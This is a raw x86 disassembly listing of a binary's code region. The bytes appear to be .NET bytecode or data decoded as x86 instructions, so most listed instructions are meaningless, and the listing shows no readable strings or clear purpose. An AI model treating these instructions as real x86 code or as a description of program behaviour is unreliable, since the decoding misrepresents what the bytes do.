  402b29:	00 00                	add    %al,(%eax)
  402b2b:	04 72                	add    $0x72,%al
  402b2d:	64 08 00             	or     %al,%fs:(%eax)
  402b30:	70 28                	jo     0x402b5a
  402b32:	3c 00                	cmp    $0x0,%al
  402b34:	00 0a                	add    %cl,(%edx)
  402b36:	28 45 00             	sub    %al,0x0(%ebp)
  402b39:	00 0a                	add    %cl,(%edx)
  402b3b:	00 00                	add    %al,(%eax)
  402b3d:	00 7e 39             	add    %bh,0x39(%esi)
  402b40:	00 00                	add    %al,(%eax)
  402b42:	0a 72 80             	or     -0x80(%edx),%dh
  402b45:	08 00                	or     %al,(%eax)
  402b47:	70 17                	jo     0x402b60
  402b49:	6f                   	outsl  %ds:(%esi),(%dx)
  402b4a:	38 00                	cmp    %al,(%eax)
  402b4c:	00 0a                	add    %cl,(%edx)
  402b4e:	13 37                	adc    (%edi),%esi
  402b50:	00 11                	add    %dl,(%ecx)
  402b52:	37                   	aaa
  402b53:	14 fe                	adc    $0xfe,%al
  402b55:	01 13                	add    %edx,(%ebx)
  402b57:	38 11                	cmp    %dl,(%ecx)
  402b59:	38 2c 10             	cmp    %ch,(%eax,%edx,1)
  402b5c:	7e 39                	jle    0x402b97
  402b5e:	00 00                	add    %al,(%eax)
  402b60:	0a 72 80             	or     -0x80(%edx),%dh
  402b63:	08 00                	or     %al,(%eax)
  402b65:	70 6f                	jo     0x402bd6
  402b67:	2b 00                	sub    (%eax),%eax
  402b69:	00 0a                	add    %cl,(%edx)
  402b6b:	26 7e 39             	es jle 0x402ba7
  402b6e:	00 00                	add    %al,(%eax)
  402b70:	0a 72 80             	or     -0x80(%edx),%dh
  402b73:	08 00                	or     %al,(%eax)
  402b75:	70 17                	jo     0x402b8e
  402b77:	6f                   	outsl  %ds:(%esi),(%dx)
  402b78:	38 00                	cmp    %al,(%eax)
  402b7a:	00 0a                	add    %cl,(%edx)
  402b7c:	13 39                	adc    (%ecx),%edi
  402b7e:	00 11                	add    %dl,(%ecx)
  402b80:	39 72 2f             	cmp    %esi,0x2f(%edx)
  402b83:	09 00                	or     %eax,(%eax)
  402b85:	70 02                	jo     0x402b89
  402b87:	7b 0b                	jnp    0x402b94
  402b89:	00 00                	add    %al,(%eax)
  402b8b:	04 6f                	add    $0x6f,%al
  402b8d:	2c 00                	sub    $0x0,%al
  402b8f:	00 0a                	add    %cl,(%edx)
  402b91:	00 00                	add    %al,(%eax)
  402b93:	de 0d 11 39 2c 08    	fimuls 0x82c3911
  402b99:	11 39                	adc    %edi,(%ecx)
  402b9b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b9c:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402ba1:	dc 00                	faddl  (%eax)
  402ba3:	de 0d 11 37 2c 08    	fimuls 0x82c3711
  402ba9:	11 37                	adc    %esi,(%edi)
  402bab:	6f                   	outsl  %ds:(%esi),(%dx)
  402bac:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402bb1:	dc 7e 29             	fdivrl 0x29(%esi)
  402bb4:	00 00                	add    %al,(%eax)
  402bb6:	0a 72 41             	or     0x41(%edx),%dh
  402bb9:	09 00                	or     %eax,(%eax)
  402bbb:	70 17                	jo     0x402bd4
  402bbd:	6f                   	outsl  %ds:(%esi),(%dx)
  402bbe:	38 00                	cmp    %al,(%eax)
  402bc0:	00 0a                	add    %cl,(%edx)
  402bc2:	13 3a                	adc    (%edx),%edi
  402bc4:	00 11                	add    %dl,(%ecx)
  402bc6:	3a 14 fe             	cmp    (%esi,%edi,8),%dl
  402bc9:	03 13                	add    (%ebx),%edx
  402bcb:	3b 11                	cmp    (%ecx),%edx
  402bcd:	3b 2c 10             	cmp    (%eax,%edx,1),%ebp
  402bd0:	00 11                	add    %dl,(%ecx)
  402bd2:	3a 72 02             	cmp    0x2(%edx),%dh
  402bd5:	04 00                	add    $0x0,%al
  402bd7:	70 07                	jo     0x402be0
  402bd9:	6f                   	outsl  %ds:(%esi),(%dx)
  402bda:	2c 00                	sub    $0x0,%al
  402bdc:	00 0a                	add    %cl,(%edx)
  402bde:	00 00                	add    %al,(%eax)
  402be0:	00 de                	add    %bl,%dh
  402be2:	0d 11 3a 2c 08       	or     $0x82c3a11,%eax
  402be7:	11 3a                	adc    %edi,(%edx)
  402be9:	6f                   	outsl  %ds:(%esi),(%dx)
  402bea:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402bef:	dc 7e 39             	fdivrl 0x39(%esi)
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	0a 72 ce             	or     -0x32(%edx),%dh
  402bf7:	09 00                	or     %eax,(%eax)
  402bf9:	70 17                	jo     0x402c12
  402bfb:	6f                   	outsl  %ds:(%esi),(%dx)
  402bfc:	38 00                	cmp    %al,(%eax)
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	13 3c 00             	adc    (%eax,%eax,1),%edi
  402c03:	11 3c 14             	adc    %edi,(%esp,%edx,1)
  402c06:	fe 03                	incb   (%ebx)
  402c08:	13 3d 11 3d 2c 3e    	adc    0x3e2c3d11,%edi
  402c0e:	00 11                	add    %dl,(%ecx)
  402c10:	3c 72                	cmp    $0x72,%al
  402c12:	14 0a                	adc    $0xa,%al
  402c14:	00 70 17             	add    %dh,0x17(%eax)
  402c17:	8c 3b                	mov    %?,(%ebx)
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	01 1a                	add    %ebx,(%edx)
  402c1d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c1e:	40                   	inc    %eax
  402c1f:	00 00                	add    %al,(%eax)
  402c21:	0a 00                	or     (%eax),%al
  402c23:	11 3c 72             	adc    %edi,(%edx,%esi,2)
  402c26:	42                   	inc    %edx
  402c27:	0a 00                	or     (%eax),%al
  402c29:	70 17                	jo     0x402c42
  402c2b:	8c 3b                	mov    %?,(%ebx)
  402c2d:	00 00                	add    %al,(%eax)
  402c2f:	01 1a                	add    %ebx,(%edx)
  402c31:	6f                   	outsl  %ds:(%esi),(%dx)
  402c32:	40                   	inc    %eax
  402c33:	00 00                	add    %al,(%eax)
  402c35:	0a 00                	or     (%eax),%al
  402c37:	11 3c 72             	adc    %edi,(%edx,%esi,2)
  402c3a:	6e                   	outsb  %ds:(%esi),(%dx)
  402c3b:	0a 00                	or     (%eax),%al
  402c3d:	70 17                	jo     0x402c56
  402c3f:	8c 3b                	mov    %?,(%ebx)
  402c41:	00 00                	add    %al,(%eax)
  402c43:	01 1a                	add    %ebx,(%edx)
  402c45:	6f                   	outsl  %ds:(%esi),(%dx)
  402c46:	40                   	inc    %eax
  402c47:	00 00                	add    %al,(%eax)
  402c49:	0a 00                	or     (%eax),%al
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	de 0d 11 3c 2c 08    	fimuls 0x82c3c11
  402c53:	11 3c 6f             	adc    %edi,(%edi,%ebp,2)
  402c56:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402c5b:	dc 7e 29             	fdivrl 0x29(%esi)
  402c5e:	00 00                	add    %al,(%eax)
  402c60:	0a 72 98             	or     -0x68(%edx),%dh
  402c63:	0a 00                	or     (%eax),%al
  402c65:	70 17                	jo     0x402c7e
  402c67:	6f                   	outsl  %ds:(%esi),(%dx)
  402c68:	38 00                	cmp    %al,(%eax)
  402c6a:	00 0a                	add    %cl,(%edx)
  402c6c:	13 3e                	adc    (%esi),%edi
  402c6e:	00 11                	add    %dl,(%ecx)
  402c70:	3e 14 fe             	ds adc $0xfe,%al
  402c73:	03 13                	add    (%ebx),%edx
  402c75:	3f                   	aas
  402c76:	11 3f                	adc    %edi,(%edi)
  402c78:	2c 52                	sub    $0x52,%al
  402c7a:	00 11                	add    %dl,(%ecx)
  402c7c:	3e 72 10             	jb,pt  0x402c8f
  402c7f:	0b 00                	or     (%eax),%eax
  402c81:	70 17                	jo     0x402c9a
  402c83:	8c 3b                	mov    %?,(%ebx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 1a                	add    %ebx,(%edx)
  402c89:	6f                   	outsl  %ds:(%esi),(%dx)
  402c8a:	40                   	inc    %eax
  402c8b:	00 00                	add    %al,(%eax)
  402c8d:	0a 00                	or     (%eax),%al
  402c8f:	11 3e                	adc    %edi,(%esi)
  402c91:	72 34                	jb     0x402cc7
  402c93:	0b 00                	or     (%eax),%eax
  402c95:	70 17                	jo     0x402cae
  402c97:	8c 3b                	mov    %?,(%ebx)
  402c99:	00 00                	add    %al,(%eax)
  402c9b:	01 1a                	add    %ebx,(%edx)
  402c9d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9e:	40                   	inc    %eax
  402c9f:	00 00                	add    %al,(%eax)
  402ca1:	0a 00                	or     (%eax),%al
  402ca3:	11 3e                	adc    %edi,(%esi)
  402ca5:	72 44                	jb     0x402ceb
  402ca7:	0b 00                	or     (%eax),%eax
  402ca9:	70 17                	jo     0x402cc2
  402cab:	8c 3b                	mov    %?,(%ebx)
  402cad:	00 00                	add    %al,(%eax)
  402caf:	01 1a                	add    %ebx,(%edx)
  402cb1:	6f                   	outsl  %ds:(%esi),(%dx)
  402cb2:	40                   	inc    %eax
  402cb3:	00 00                	add    %al,(%eax)
  402cb5:	0a 00                	or     (%eax),%al
  402cb7:	11 3e                	adc    %edi,(%esi)
  402cb9:	72 56                	jb     0x402d11
  402cbb:	0b 00                	or     (%eax),%eax
  402cbd:	70 17                	jo     0x402cd6
  402cbf:	8c 3b                	mov    %?,(%ebx)
  402cc1:	00 00                	add    %al,(%eax)
  402cc3:	01 1a                	add    %ebx,(%edx)
  402cc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc6:	40                   	inc    %eax
  402cc7:	00 00                	add    %al,(%eax)
  402cc9:	0a 00                	or     (%eax),%al
  402ccb:	00 00                	add    %al,(%eax)
  402ccd:	de 0d 11 3e 2c 08    	fimuls 0x82c3e11
  402cd3:	11 3e                	adc    %edi,(%esi)
  402cd5:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd6:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402cdb:	dc 1d 8d 33 00 00    	fcompl 0x338d
  402ce1:	01 25 16 1f 25 28    	add    %esp,0x28251f16
  402ce7:	41                   	inc    %ecx
  402ce8:	00 00                	add    %al,(%eax)
  402cea:	0a a2 25 17 1f 24    	or     0x241f1725(%edx),%ah
  402cf0:	28 41 00             	sub    %al,0x0(%ecx)
  402cf3:	00 0a                	add    %cl,(%edx)
  402cf5:	a2 25 18 1f 26       	mov    %al,0x261f1825
  402cfa:	28 41 00             	sub    %al,0x0(%ecx)
  402cfd:	00 0a                	add    %cl,(%edx)
  402cff:	a2 25 19 1f 2a       	mov    %al,0x2a1f1925
  402d04:	28 41 00             	sub    %al,0x0(%ecx)
  402d07:	00 0a                	add    %cl,(%edx)
  402d09:	a2 25 1a 72 62       	mov    %al,0x62721a25
  402d0e:	0b 00                	or     (%eax),%eax
  402d10:	70 a2                	jo     0x402cb4
  402d12:	25 1b 72 9a 0b       	and    $0xb9a721b,%eax
  402d17:	00 70 a2             	add    %dh,-0x5e(%eax)
  402d1a:	25 1c 72 d0 0b       	and    $0xbd0721c,%eax
  402d1f:	00 70 a2             	add    %dh,-0x5e(%eax)
  402d22:	13 08                	adc    (%eax),%ecx
  402d24:	00 11                	add    %dl,(%ecx)
  402d26:	08 13                	or     %dl,(%ebx)
  402d28:	40                   	inc    %eax
  402d29:	16                   	push   %ss
  402d2a:	13 41 38             	adc    0x38(%ecx),%eax
  402d2d:	81 00 00 00 11 40    	addl   $0x40110000,(%eax)
  402d33:	11 41 9a             	adc    %eax,-0x66(%ecx)
  402d36:	13 42 00             	adc    0x0(%edx),%eax
  402d39:	00 11                	add    %dl,(%ecx)
  402d3b:	42                   	inc    %edx
  402d3c:	28 47 00             	sub    %al,0x0(%edi)
  402d3f:	00 0a                	add    %cl,(%edx)
  402d41:	13 43 11             	adc    0x11(%ebx),%eax
  402d44:	43                   	inc    %ebx
  402d45:	2c 5c                	sub    $0x5c,%al
  402d47:	00 11                	add    %dl,(%ecx)
  402d49:	42                   	inc    %edx
  402d4a:	72 f0                	jb     0x402d3c
  402d4c:	0b 00                	or     (%eax),%eax
  402d4e:	70 28                	jo     0x402d78
  402d50:	42                   	inc    %edx
  402d51:	00 00                	add    %al,(%eax)
  402d53:	0a 13                	or     (%ebx),%dl
  402d55:	44                   	inc    %esp
  402d56:	11 44 28 43          	adc    %eax,0x43(%eax,%ebp,1)
  402d5a:	00 00                	add    %al,(%eax)
  402d5c:	0a 16                	or     (%esi),%dl
  402d5e:	fe 01                	incb   (%ecx)
  402d60:	13 46 11             	adc    0x11(%esi),%eax
  402d63:	46                   	inc    %esi
  402d64:	2c 0f                	sub    $0xf,%al
  402d66:	02 7b 0b             	add    0xb(%ebx),%bh
  402d69:	00 00                	add    %al,(%eax)
  402d6b:	04 11                	add    $0x11,%al
  402d6d:	44                   	inc    %esp
  402d6e:	17                   	pop    %ss
  402d6f:	28 48 00             	sub    %cl,0x0(%eax)
  402d72:	00 0a                	add    %cl,(%edx)
  402d74:	00 11                	add    %dl,(%ecx)
  402d76:	42                   	inc    %edx
  402d77:	72 08                	jb     0x402d81
  402d79:	0c 00                	or     $0x0,%al
  402d7b:	70 28                	jo     0x402da5
  402d7d:	42                   	inc    %edx
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	0a 13                	or     (%ebx),%dl
  402d82:	45                   	inc    %ebp
  402d83:	11 45 28             	adc    %eax,0x28(%ebp)
  402d86:	43                   	inc    %ebx
  402d87:	00 00                	add    %al,(%eax)
  402d89:	0a 16                	or     (%esi),%dl
  402d8b:	fe 01                	incb   (%ecx)
  402d8d:	13 47 11             	adc    0x11(%edi),%eax
  402d90:	47                   	inc    %edi
  402d91:	2c 0f                	sub    $0xf,%al
  402d93:	02 7b 0b             	add    0xb(%ebx),%bh
  402d96:	00 00                	add    %al,(%eax)
  402d98:	04 11                	add    $0x11,%al
  402d9a:	45                   	inc    %ebp
  402d9b:	17                   	pop    %ss
  402d9c:	28 48 00             	sub    %cl,0x0(%eax)
  402d9f:	00 0a                	add    %cl,(%edx)
  402da1:	00 00                	add    %al,(%eax)
  402da3:	00 de                	add    %bl,%dh
  402da5:	05 26 00 00 de       	add    $0xde000026,%eax
  402daa:	00 00                	add    %al,(%eax)
  402dac:	11 41 17             	adc    %eax,0x17(%ecx)
  402daf:	58                   	pop    %eax
  402db0:	13 41 11             	adc    0x11(%ecx),%eax
  402db3:	41                   	inc    %ecx
  402db4:	11 40 8e             	adc    %eax,-0x72(%eax)
  402db7:	69 3f 74 ff ff ff    	imul   $0xffffff74,(%edi),%edi
  402dbd:	02 72 22             	add    0x22(%edx),%dh
  402dc0:	0c 00                	or     $0x0,%al
  402dc2:	70 28                	jo     0x402dec
  402dc4:	30 00                	xor    %al,(%eax)
  402dc6:	00 06                	add    %al,(%esi)
  402dc8:	00 00                	add    %al,(%eax)
  402dca:	de 1e                	ficomps (%esi)
  402dcc:	13 48 00             	adc    0x0(%eax),%ecx
  402dcf:	02 72 64             	add    0x64(%edx),%dh
  402dd2:	0c 00                	or     $0x0,%al
  402dd4:	70 11                	jo     0x402de7
  402dd6:	48                   	dec    %eax
  402dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  402dd8:	49                   	dec    %ecx
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	0a 28                	or     (%eax),%ch
  402ddd:	3f                   	aas
  402dde:	00 00                	add    %al,(%eax)
  402de0:	0a 28                	or     (%eax),%ch
  402de2:	30 00                	xor    %al,(%eax)
  402de4:	00 06                	add    %al,(%esi)
  402de6:	00 00                	add    %al,(%eax)
  402de8:	de 00                	fiadds (%eax)
  402dea:	2a 00                	sub    (%eax),%al
  402dec:	41                   	inc    %ecx
  402ded:	8c 02                	mov    %es,(%edx)
  402def:	00 02                	add    %al,(%edx)
  402df1:	00 00                	add    %al,(%eax)
  402df3:	00 14 00             	add    %dl,(%eax,%eax,1)
  402df6:	00 00                	add    %al,(%eax)
  402df8:	22 00                	and    (%eax),%al
  402dfa:	00 00                	add    %al,(%eax)
  402dfc:	36 00 00             	add    %al,%ss:(%eax)
  402dff:	00 0d 00 00 00 00    	add    %cl,0x0
  402e05:	00 00                	add    %al,(%eax)
  402e07:	00 02                	add    %al,(%edx)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	00 55 00             	add    %dl,0x0(%ebp)
  402e0e:	00 00                	add    %al,(%eax)
  402e10:	22 00                	and    (%eax),%al
  402e12:	00 00                	add    %al,(%eax)
  402e14:	77 00                	ja     0x402e16
  402e16:	00 00                	add    %al,(%eax)
  402e18:	0d 00 00 00 00       	or     $0x0,%eax
  402e1d:	00 00                	add    %al,(%eax)
  402e1f:	00 02                	add    %al,(%edx)
  402e21:	00 00                	add    %al,(%eax)
  402e23:	00 96 00 00 00 22    	add    %dl,0x22000000(%esi)
  402e29:	00 00                	add    %al,(%eax)
  402e2b:	00 b8 00 00 00 0d    	add    %bh,0xd000000(%eax)
  402e31:	00 00                	add    %al,(%eax)
  402e33:	00 00                	add    %al,(%eax)
  402e35:	00 00                	add    %al,(%eax)
  402e37:	00 02                	add    %al,(%edx)
  402e39:	00 00                	add    %al,(%eax)
  402e3b:	00 d7                	add    %dl,%bh
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	00 22                	add    %ah,(%edx)
  402e41:	00 00                	add    %al,(%eax)
  402e43:	00 f9                	add    %bh,%cl
  402e45:	00 00                	add    %al,(%eax)
  402e47:	00 0d 00 00 00 00    	add    %cl,0x0
  402e4d:	00 00                	add    %al,(%eax)
  402e4f:	00 02                	add    %al,(%edx)
  402e51:	00 00                	add    %al,(%eax)
  402e53:	00 46 01             	add    %al,0x1(%esi)
  402e56:	00 00                	add    %al,(%eax)
  402e58:	17                   	pop    %ss
  402e59:	00 00                	add    %al,(%eax)
  402e5b:	00 5d 01             	add    %bl,0x1(%ebp)
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	0d 00 00 00 00       	or     $0x0,%eax
  402e65:	00 00                	add    %al,(%eax)
  402e67:	00 02                	add    %al,(%edx)
  402e69:	00 00                	add    %al,(%eax)
  402e6b:	00 18                	add    %bl,(%eax)
  402e6d:	01 00                	add    %eax,(%eax)
  402e6f:	00 55 00             	add    %dl,0x0(%ebp)
  402e72:	00 00                	add    %al,(%eax)
  402e74:	6d                   	insl   (%dx),%es:(%edi)
  402e75:	01 00                	add    %eax,(%eax)
  402e77:	00 0d 00 00 00 00    	add    %cl,0x0
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	00 02                	add    %al,(%edx)
  402e81:	00 00                	add    %al,(%eax)
  402e83:	00 ba 01 00 00 17    	add    %bh,0x17000001(%edx)
  402e89:	00 00                	add    %al,(%eax)
  402e8b:	00 d1                	add    %dl,%cl
  402e8d:	01 00                	add    %eax,(%eax)
  402e8f:	00 0d 00 00 00 00    	add    %cl,0x0
  402e95:	00 00                	add    %al,(%eax)
  402e97:	00 02                	add    %al,(%edx)
  402e99:	00 00                	add    %al,(%eax)
  402e9b:	00 8c 01 00 00 55 00 	add    %cl,0x550000(%ecx,%eax,1)
  402ea2:	00 00                	add    %al,(%eax)
  402ea4:	e1 01                	loope  0x402ea7
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	0d 00 00 00 00       	or     $0x0,%eax
  402ead:	00 00                	add    %al,(%eax)
  402eaf:	00 02                	add    %al,(%edx)
  402eb1:	00 00                	add    %al,(%eax)
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	02 00                	add    (%eax),%al
  402eb7:	00 53 00             	add    %dl,0x0(%ebx)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	53                   	push   %ebx
  402ebd:	02 00                	add    (%eax),%al
  402ebf:	00 0d 00 00 00 00    	add    %cl,0x0
  402ec5:	00 00                	add    %al,(%eax)
  402ec7:	00 02                	add    %al,(%edx)
  402ec9:	00 00                	add    %al,(%eax)
  402ecb:	00 72 02             	add    %dh,0x2(%edx)
  402ece:	00 00                	add    %al,(%eax)
  402ed0:	53                   	push   %ebx
  402ed1:	00 00                	add    %al,(%eax)
  402ed3:	00 c5                	add    %al,%ch
  402ed5:	02 00                	add    (%eax),%al
  402ed7:	00 0d 00 00 00 00    	add    %cl,0x0
  402edd:	00 00                	add    %al,(%eax)
  402edf:	00 02                	add    %al,(%edx)
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	00 11                	add    %dl,(%ecx)
  402ee5:	03 00                	add    (%eax),%eax
  402ee7:	00 29                	add    %ch,(%ecx)
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	00 3a                	add    %bh,(%edx)
  402eed:	03 00                	add    (%eax),%eax
  402eef:	00 0d 00 00 00 00    	add    %cl,0x0
  402ef5:	00 00                	add    %al,(%eax)
  402ef7:	00 02                	add    %al,(%edx)
  402ef9:	00 00                	add    %al,(%eax)
  402efb:	00 e4                	add    %ah,%ah
  402efd:	02 00                	add    (%eax),%al
  402eff:	00 66 00             	add    %ah,0x0(%esi)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	4a                   	dec    %edx
  402f05:	03 00                	add    (%eax),%eax
  402f07:	00 0d 00 00 00 00    	add    %cl,0x0
  402f0d:	00 00                	add    %al,(%eax)
  402f0f:	00 02                	add    %al,(%edx)
  402f11:	00 00                	add    %al,(%eax)
  402f13:	00 69 03             	add    %ch,0x3(%ecx)
  402f16:	00 00                	add    %al,(%eax)
  402f18:	53                   	push   %ebx
  402f19:	00 00                	add    %al,(%eax)
  402f1b:	00 bc 03 00 00 0d 00 	add    %bh,0xd0000(%ebx,%eax,1)
  402f22:	00 00                	add    %al,(%eax)
  402f24:	00 00                	add    %al,(%eax)
  402f26:	00 00                	add    %al,(%eax)
  402f28:	02 00                	add    (%eax),%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	db 03                	fildl  (%ebx)
  402f2e:	00 00                	add    %al,(%eax)
  402f30:	53                   	push   %ebx
  402f31:	00 00                	add    %al,(%eax)
  402f33:	00 2e                	add    %ch,(%esi)
  402f35:	04 00                	add    $0x0,%al
  402f37:	00 0d 00 00 00 00    	add    %cl,0x0
  402f3d:	00 00                	add    %al,(%eax)
  402f3f:	00 02                	add    %al,(%edx)
  402f41:	00 00                	add    %al,(%eax)
  402f43:	00 7b 04             	add    %bh,0x4(%ebx)
  402f46:	00 00                	add    %al,(%eax)
  402f48:	17                   	pop    %ss
  402f49:	00 00                	add    %al,(%eax)
  402f4b:	00 92 04 00 00 0d    	add    %dl,0xd000004(%edx)
  402f51:	00 00                	add    %al,(%eax)
  402f53:	00 00                	add    %al,(%eax)
  402f55:	00 00                	add    %al,(%eax)
  402f57:	00 02                	add    %al,(%edx)
  402f59:	00 00                	add    %al,(%eax)
  402f5b:	00 4d 04             	add    %cl,0x4(%ebp)
  402f5e:	00 00                	add    %al,(%eax)
  402f60:	55                   	push   %ebp
  402f61:	00 00                	add    %al,(%eax)
  402f63:	00 a2 04 00 00 0d    	add    %ah,0xd000004(%edx)
  402f69:	00 00                	add    %al,(%eax)
  402f6b:	00 00                	add    %al,(%eax)
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	00 02                	add    %al,(%edx)
  402f71:	00 00                	add    %al,(%eax)
  402f73:	00 15 05 00 00 29    	add    %dl,0x29000005
  402f79:	00 00                	add    %al,(%eax)
  402f7b:	00 3e                	add    %bh,(%esi)
  402f7d:	05 00 00 0d 00       	add    $0xd0000,%eax
  402f82:	00 00                	add    %al,(%eax)
  402f84:	00 00                	add    %al,(%eax)
  402f86:	00 00                	add    %al,(%eax)
  402f88:	02 00                	add    (%eax),%al
  402f8a:	00 00                	add    %al,(%eax)
  402f8c:	db 04 00             	fildl  (%eax,%eax,1)
  402f8f:	00 73 00             	add    %dh,0x0(%ebx)
  402f92:	00 00                	add    %al,(%eax)
  402f94:	4e                   	dec    %esi
  402f95:	05 00 00 0d 00       	add    $0xd0000,%eax
  402f9a:	00 00                	add    %al,(%eax)
  402f9c:	00 00                	add    %al,(%eax)
  402f9e:	00 00                	add    %al,(%eax)
  402fa0:	02 00                	add    (%eax),%al
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	6d                   	insl   (%dx),%es:(%edi)
  402fa5:	05 00 00 67 00       	add    $0x670000,%eax
  402faa:	00 00                	add    %al,(%eax)
  402fac:	d4 05                	aam    $0x5
  402fae:	00 00                	add    %al,(%eax)
  402fb0:	0d 00 00 00 00       	or     $0x0,%eax
  402fb5:	00 00                	add    %al,(%eax)
  402fb7:	00 02                	add    %al,(%edx)
  402fb9:	00 00                	add    %al,(%eax)
  402fbb:	00 5f 06             	add    %bl,0x6(%edi)
  402fbe:	00 00                	add    %al,(%eax)
  402fc0:	24 00                	and    $0x0,%al
  402fc2:	00 00                	add    %al,(%eax)
  402fc4:	83 06 00             	addl   $0x0,(%esi)
  402fc7:	00 0d 00 00 00 00    	add    %cl,0x0
  402fcd:	00 00                	add    %al,(%eax)
  402fcf:	00 02                	add    %al,(%edx)
  402fd1:	00 00                	add    %al,(%eax)
  402fd3:	00 ce                	add    %cl,%dh
  402fd5:	07                   	pop    %es
  402fd6:	00 00                	add    %al,(%eax)
  402fd8:	17                   	pop    %ss
  402fd9:	00 00                	add    %al,(%eax)
  402fdb:	00 e5                	add    %ah,%ch
  402fdd:	07                   	pop    %es
  402fde:	00 00                	add    %al,(%eax)
  402fe0:	0d 00 00 00 00       	or     $0x0,%eax
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 02                	add    %al,(%edx)
  402fe9:	00 00                	add    %al,(%eax)
  402feb:	00 a0 07 00 00 55    	add    %ah,0x55000007(%eax)
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	00 f5                	add    %dh,%ch
  402ff5:	07                   	pop    %es
  402ff6:	00 00                	add    %al,(%eax)
  402ff8:	0d 00 00 00 00       	or     $0x0,%eax
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	00 02                	add    %al,(%edx)
  403001:	00 00                	add    %al,(%eax)
  403003:	00 14 08             	add    %dl,(%eax,%ecx,1)
  403006:	00 00                	add    %al,(%eax)
  403008:	1f                   	pop    %ds
  403009:	00 00                	add    %al,(%eax)
  40300b:	00 33                	add    %dh,(%ebx)
  40300d:	08 00                	or     %al,(%eax)
  40300f:	00 0d 00 00 00 00    	add    %cl,0x0
  403015:	00 00                	add    %al,(%eax)
  403017:	00 02                	add    %al,(%edx)
  403019:	00 00                	add    %al,(%eax)
  40301b:	00 52 08             	add    %dl,0x8(%edx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	4d                   	dec    %ebp
  403021:	00 00                	add    %al,(%eax)
  403023:	00 9f 08 00 00 0d    	add    %bl,0xd000008(%edi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 00                	add    %al,(%eax)
  40302d:	00 00                	add    %al,(%eax)
  40302f:	00 02                	add    %al,(%edx)
  403031:	00 00                	add    %al,(%eax)
  403033:	00 be 08 00 00 61    	add    %bh,0x61000008(%esi)
  403039:	00 00                	add    %al,(%eax)
  40303b:	00 1f                	add    %bl,(%edi)
  40303d:	09 00                	or     %eax,(%eax)
  40303f:	00 0d 00 00 00 00    	add    %cl,0x0
  403045:	00 00                	add    %al,(%eax)
  403047:	00 00                	add    %al,(%eax)
  403049:	00 00                	add    %al,(%eax)
  40304b:	00 89 09 00 00 6d    	add    %cl,0x6d000009(%ecx)
  403051:	00 00                	add    %al,(%eax)
  403053:	00 f6                	add    %dh,%dh
  403055:	09 00                	or     %eax,(%eax)
  403057:	00 05 00 00 00 12    	add    %al,0x12000000
  40305d:	00 00                	add    %al,(%eax)
  40305f:	01 00                	add    %eax,(%eax)
  403061:	00 00                	add    %al,(%eax)
  403063:	00 01                	add    %al,(%ecx)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 1b                	add    %bl,(%ebx)
  403069:	0a 00                	or     (%eax),%al
  40306b:	00 1c 0a             	add    %bl,(%edx,%ecx,1)
  40306e:	00 00                	add    %al,(%eax)
  403070:	1e                   	push   %ds
  403071:	00 00                	add    %al,(%eax)
  403073:	00 1d 00 00 01 1b    	add    %bl,0x1b010000
  403079:	30 03                	xor    %al,(%ebx)
  40307b:	00 46 00             	add    %al,0x0(%esi)
  40307e:	00 00                	add    %al,(%eax)
  403080:	06                   	push   %es
  403081:	00 00                	add    %al,(%eax)
  403083:	11 00                	adc    %eax,(%eax)
  403085:	00 03                	add    %al,(%ebx)
  403087:	28 47 00             	sub    %al,0x0(%edi)
  40308a:	00 0a                	add    %cl,(%edx)
  40308c:	0a 06                	or     (%esi),%al
  40308e:	2c 31                	sub    $0x31,%al
  403090:	00 03                	add    %al,(%ebx)
  403092:	72 84                	jb     0x403018
  403094:	0c 00                	or     $0x0,%al
  403096:	70 28                	jo     0x4030c0
  403098:	42                   	inc    %edx
  403099:	00 00                	add    %al,(%eax)
  40309b:	0a 0b                	or     (%ebx),%cl
  40309d:	07                   	pop    %es
  40309e:	28 43 00             	sub    %al,0x0(%ebx)
  4030a1:	00 0a                	add    %cl,(%edx)
  4030a3:	16                   	push   %ss
  4030a4:	fe 01                	incb   (%ecx)
  4030a6:	0c 08                	or     $0x8,%al
  4030a8:	2c 0e                	sub    $0xe,%al
  4030aa:	02 7b 0b             	add    0xb(%ebx),%bh
  4030ad:	00 00                	add    %al,(%eax)
  4030af:	04 07                	add    $0x7,%al
  4030b1:	17                   	pop    %ss
  4030b2:	28 48 00             	sub    %cl,0x0(%eax)
  4030b5:	00 0a                	add    %cl,(%edx)
  4030b7:	00 07                	add    %al,(%edi)
  4030b9:	18 28                	sbb    %ch,(%eax)
  4030bb:	4a                   	dec    %edx
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	0a 00                	or     (%eax),%al
